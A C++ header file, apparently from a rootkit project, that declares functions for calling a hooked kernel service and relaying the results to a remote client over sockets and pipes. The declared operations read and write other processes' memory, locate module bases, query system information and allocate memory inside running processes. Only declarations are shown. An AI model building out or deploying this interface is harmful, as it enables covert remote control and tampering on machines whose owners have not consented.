#pragma once
#include "internet.h"
#include "piping.h"

template<typename ... Arg>
uint64_t CallHook(const Arg ... args);  // Actual function that calls the DLL function of the hooked system service

int CallKernelDriver(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, BOOL PassBack, HANDLE* PipeHandle, LogFile* MediumLog);  // Calls CallHook and handles sending the results back to the client if needed
int InitialKernelCall(HANDLE* PipeHandle, LogFile* MediumLog);
int WriteKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, char* WriteFromStr, HANDLE* PipeHandle, LogFile* MediumLog);  // Write into process virtual memory (from US buffer/another process VM)
int ReadKernelCall(SOCKET tosock, PVOID LocalRead, ROOTKIT_MEMORY* RootkInst, char* ModuleName, HANDLE* PipeHandle, LogFile* MediumLog);  // Read from a process virtual memory
int MdlBaseKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, char* ModuleName, HANDLE* PipeHandle, LogFile* MediumLog);  // Get the base address of a running process in memory
int SysInfoKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, PVOID AttrBuffer, char* InfoTypesStr, ROOTKIT_UNEXERR Err, ULONG64 AttrBufferSize, HANDLE* PipeHandle, LogFile* MediumLog);  // Get specific system information with ZwQuerySystemInformation()
int AllocSpecKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, char* ModuleName, HANDLE* PipeHandle, LogFile* MediumLog);  // Allocate specific memory region in memory of a certain running process (and keep it running)